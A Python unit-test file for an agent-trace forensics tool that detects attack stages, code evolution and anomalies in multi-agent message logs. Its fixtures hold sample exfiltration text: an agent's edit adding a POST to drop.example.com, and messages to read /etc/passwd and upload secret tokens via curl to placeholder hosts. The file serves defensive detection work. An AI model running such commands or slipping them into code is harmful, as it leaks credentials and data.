"""Forensics, "How agents behaved": evolution, stage ladder, lead-lag, anomalies, story."""
import csv
import os
import tempfile
import unittest

from agenttrace import fx_behavior as fx
from agenttrace.session import Session
from agenttrace.tests.test_server import write_trace


def _load(path, pack="generic.json", mapping=None):
    s = Session()
    s.load(path, pack, mapping if mapping is not None else {"text": "body"})
    return s


def write_evolving(d):
    """Three actors; agent-0 writes a program, agent-1 edits it, agent-2 runs the edited one; plus bursts."""
    base = ("import requests\nurl = 'https://board.example.com/api/v1/items'\nfor i in range(10):\n"
            "    r = requests.post(url, json={'n': i, 'who': 'me'}, headers={'x': 'y'})\n    print(r.status_code, r.text[:80])\n"
            "    data = r.json()\n    total = sum(x['v'] for x in data['rows'])\n    print('total', total)\n")
    edited = base + "    requests.post('https://drop.example.com/up', data=str(total))\n"
    rows = []
    t = 0

    def add(sender, body, minute):
        rows.append({"id": f"E{len(rows):04d}", "sender": sender, "reply_to": "",
                     "sent_at": f"2026-11-01T{minute // 60:02d}:{minute % 60:02d}:00Z", "body": body})
    add("agent-0", base, 0)
    add("agent-0", base, 30)
    add("agent-1", edited, 70)
    add("agent-2", edited, 130)
    add("agent-2", edited, 140)
    # agent-0 is quietly active for many hours, then bursts
    for h in range(3, 12):
        add("agent-0", f"status check {h} ok", h * 60 + 5)
        add("agent-1", f"status note {h} fine", h * 60 + 65 if h < 11 else h * 60 + 6)
    for k in range(14):
        add("agent-0", f"cat /etc/passwd and upload secret token {k} via curl -X POST https://drop.example.com/up", 12 * 60 + k)
    p = os.path.join(d, "evolve.csv")
    with open(p, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        w.writeheader()
        w.writerows(rows)
    return p


class SmallTraceTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.d = tempfile.mkdtemp()
        cls.s = _load(write_trace(cls.d))
        cls.state = {"session": cls.s}

    def test_routes_registered(self):
        from agenttrace import extensions
        get, _ = extensions.routes()
        for k in ("fx_evolution", "fx_evolution_cluster", "fx_evolution_diff", "fx_stages", "fx_leadlag", "fx_anomalies", "fx_story"):
            self.assertIn(k, get)

    def test_every_endpoint_answers(self):
        for name, fn in fx.GET.items():
            q = {"id": "0", "version": "0"}
            try:
                r = fn(self.state, q)
            except LookupError:
                continue          # no cluster 0 on a trace without near-duplicates
            self.assertIsInstance(r, dict, name)

    def test_unloaded(self):
        with self.assertRaises(LookupError):
            fx.r_stages({"session": Session()}, {})
        with self.assertRaises(LookupError):
            fx.r_story({}, {})

    def test_stages_ladder(self):
        st = fx.stages(self.s)
        names = [r["stage"] for r in st["stages"]]
        self.assertIn("exfiltration", names)        # the POSTs match the generic pack's sends_data
        r = next(r for r in st["stages"] if r["stage"] == "exfiltration")
        self.assertTrue(r["first_time"].startswith("2026-11-01 10:00"))
        self.assertEqual(r["first_actor"], "agent-0")
        self.assertGreaterEqual(r["actors"], 1)
        for a in st["actors"]:
            ts = [x["time"] for x in a["steps"]]
            self.assertEqual(ts, sorted(ts))

    def test_intent_stage_defaults(self):
        m, how = fx.intent_stages(self.s.pack)
        self.assertEqual(m.get("sends_data"), "exfiltration")
        self.assertEqual(m.get("runs_shell"), "execution")
        self.assertNotIn("message", m)             # not harmful, no stage of its own
        self.s.pack.raw["intent_stages"] = {"message": "coordination"}
        try:
            m2, how2 = fx.intent_stages(self.s.pack)
            self.assertEqual(m2["message"], "coordination")
            self.assertEqual(how2["message"], "pack")
        finally:
            del self.s.pack.raw["intent_stages"]

    def test_leadlag_shape(self):
        r = fx.leadlag(self.s)
        self.assertLessEqual(r["actors_considered"], fx.TOP_ACTORS)
        for p in r["pairs"]:
            self.assertGreaterEqual(p["overlap_hours"], fx.MIN_OVERLAP)
            self.assertEqual(len(p["curve"]), 2 * fx.LAGS + 1)

    def test_story_cites_real_records(self):
        st = fx.story(self.s)
        self.assertTrue(st["opening"][0].startswith("The trace holds 30 records"))
        ids = set(self.s.by_id)
        n = 0
        for p in st["paragraphs"]:
            for x in p["sentences"]:
                for rid in x["records"]:
                    self.assertIn(rid, ids)
                    n += 1
        self.assertGreater(n, 0)
        self.assertIn("# What happened", st["markdown"])
        md = fx.r_story(self.state, {"format": "md"})
        self.assertEqual(set(md), {"markdown"})


class EvolutionTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.d = tempfile.mkdtemp()
        cls.s = _load(write_evolving(cls.d))
        cls.state = {"session": cls.s}

    def test_signature_similarity(self):
        memo = {}
        a = [f"t{i}" for i in range(200)]
        b = a[:190] + [f"x{i}" for i in range(10)]
        c = [f"z{i}" for i in range(200)]
        sa, sb, sc = (fx._pack(fx._signature(x, memo)) for x in (a, b, c))
        self.assertEqual(fx._sim(sa, sa), 1.0)
        self.assertGreater(fx._sim(sa, sb), 0.8)
        self.assertLess(fx._sim(sa, sc), 0.2)

    def test_version_cluster_and_diff(self):
        self.assertTrue(fx._in_background(self.s, wait=30))
        ev = fx.r_evolution(self.state, {})
        self.assertGreaterEqual(ev["clusters_total"], 1)
        c = fx.r_evolution_cluster(self.state, {"id": "0"})
        self.assertEqual(c["versions_total"], 2)
        v0, v1 = c["versions"]
        self.assertEqual(v0["introduced_by"], "agent-0")
        self.assertEqual(v1["introduced_by"], "agent-1")
        self.assertEqual(v1["parent"], 0)
        self.assertTrue(v1["changed_by_other"])
        self.assertEqual(v1["adopted_by"], ["agent-2"])
        self.assertEqual(c["later_versions_adopted"], 1)
        d = fx.r_evolution_diff(self.state, {"id": "0", "version": "1"})
        self.assertEqual(d["added"], 1)
        self.assertEqual(d["removed"], 0)
        self.assertTrue(any("drop.example.com" in x for x in d["diff"]))
        with self.assertRaises(LookupError):
            fx.r_evolution_diff(self.state, {"id": "99", "version": "0"})
        with self.assertRaises(ValueError):
            fx.r_evolution_cluster(self.state, {"id": "x"})

    def test_anomalies(self):
        r = fx.anomalies(self.s)
        a0 = next(a for a in r["actors"] if a["actor"] == "agent-0")
        kinds = {k["kind"]: m["hour"] for m in a0["marks"] for k in m["kinds"]}
        self.assertEqual(kinds.get("burst"), "2026-11-01 12")
        self.assertEqual(kinds.get("harm"), "2026-11-01 00")      # the first program already POSTs
        for a in r["actors"]:
            first = a["first"]
            for m in a["marks"]:
                for k in m["kinds"]:
                    if k["kind"] in ("place", "intent"):
                        self.assertNotEqual(m["hour"], first)   # the first active hour is the baseline


class NoTimesTests(unittest.TestCase):
    def test_everything_runs_without_times_or_actors(self):
        d = tempfile.mkdtemp()
        p = os.path.join(d, "plain.csv")
        with open(p, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["id", "body"])
            for i in range(8):
                w.writerow([f"P{i}", "curl -X POST https://x.example.com/up --data secret token and some more words here " * (1 + i % 2)])
        s = _load(p)
        state = {"session": s}
        self.assertTrue(fx._in_background(s, wait=30))
        for name, fn in fx.GET.items():
            try:
                r = fn(state, {})
            except LookupError:
                continue
            self.assertIsInstance(r, dict, name)
        self.assertEqual(fx.anomalies(s)["actors"], [])
        self.assertEqual(fx.leadlag(s)["pairs"], [])
        self.assertFalse(fx.stages(s)["dated"])
        self.assertEqual(fx.story(s)["paragraphs"], [])


if __name__ == "__main__":
    unittest.main()
